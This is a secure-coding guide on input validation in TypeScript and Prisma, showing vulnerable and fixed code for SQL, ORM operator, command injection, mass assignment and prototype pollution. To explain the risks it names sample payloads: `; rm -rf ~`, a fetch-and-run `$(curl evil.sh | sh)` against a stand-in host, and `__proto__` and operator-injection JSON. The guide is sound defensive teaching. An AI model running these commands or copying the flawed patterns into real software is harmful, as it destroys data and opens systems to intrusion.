# Data Access & Input Validation

## SQL Injection

Always use parameterized queries or ORM methods. Never concatenate user input into SQL strings:

```typescript
// BAD: SQL injection via string concatenation
const result = await db.query(`SELECT * FROM users WHERE id = '${userId}'`);

// GOOD: parameterized query
const result = await db.query('SELECT * FROM users WHERE id = $1', [userId]);
```

## ORM Safety (Prisma)

Even with an ORM, injection is possible:

- **Validate input types with Zod before passing to Prisma.** `findFirst` and similar methods are vulnerable to operator injection if unvalidated objects are passed as filter values. An attacker can send `{ "email": { "contains": "" } }` to match all records.

```typescript
// BAD: raw request body passed directly to Prisma
const user = await prisma.user.findFirst({ where: req.body });

// GOOD: validate with Zod first
const schema = z.object({ email: z.string().email() });
const parsed = schema.parse(req.body);
const user = await prisma.user.findFirst({ where: { email: parsed.email } });
```

- **Never use `$queryRawUnsafe` or `$executeRawUnsafe` with user-supplied input.** These bypass Prisma's parameterization entirely.

```typescript
// BAD: raw SQL with user input
const results = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE name = '${name}'`
);

// GOOD: use the safe raw query with parameters
const results = await prisma.$queryRaw`
  SELECT * FROM users WHERE name = ${name}
`;
```

## Input Validation

Validate all external input at system boundaries using a runtime schema validator (Zod, Yup, Joi, etc.):

- API route handlers
- Server Actions
- Webhook handlers
- Form submissions
- URL parameters and query strings

Don't rely on TypeScript types alone — they're compile-time only and don't exist at runtime. An attacker sending a malformed request bypasses all TypeScript checks.

```typescript
// TypeScript type provides NO runtime protection
type CreateUserInput = { name: string; email: string };

// Zod schema provides ACTUAL runtime validation
const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
});
```

## Mass Assignment

Don't spread request bodies directly into database operations. An attacker can add unexpected fields:

```typescript
// BAD: attacker can add { isAdmin: true, credits: 99999 }
await db.users.update({ where: { id }, data: req.body });

// GOOD: pick only allowed fields
const { name, email } = validated.data;
await db.users.update({ where: { id }, data: { name, email } });
```

## Command Injection

Never build a shell command from user input. Passing a string to a shell lets `; rm -rf ~` or `$(curl evil.sh | sh)` run on your server:

```typescript
// BAD: the filename is interpreted by a shell
exec(`convert ${req.body.file} out.png`);

// GOOD: no shell; arguments are passed as a list
execFile('convert', [file, 'out.png']);
```

Input starting with `-` can still be read as an option, so validate it (e.g. allow only generated filenames), and put `--` before it for commands that support that, such as `git`. Python: `subprocess.run(['convert', file, 'out.png'])`, never `shell=True` or `os.system` with user input. Never pass user input to `eval`, `new Function`, `vm`, Python's `eval`/`exec`, `pickle.loads` or `yaml.load` (use `yaml.safe_load`).

## Prototype Pollution (JavaScript)

Deep-merging untrusted JSON into an object lets an attacker send `{"__proto__": {"isAdmin": true}}` and give *every* object an `isAdmin` property:

- Don't deep-merge request bodies into config, defaults or user objects. Validate with a schema first (Zod's `z.object` drops unknown keys by default).
- Reject the keys `__proto__`, `constructor` and `prototype` in any code that copies user-supplied keys.
- Use `Map` or `Object.create(null)` for lookups keyed by user input.
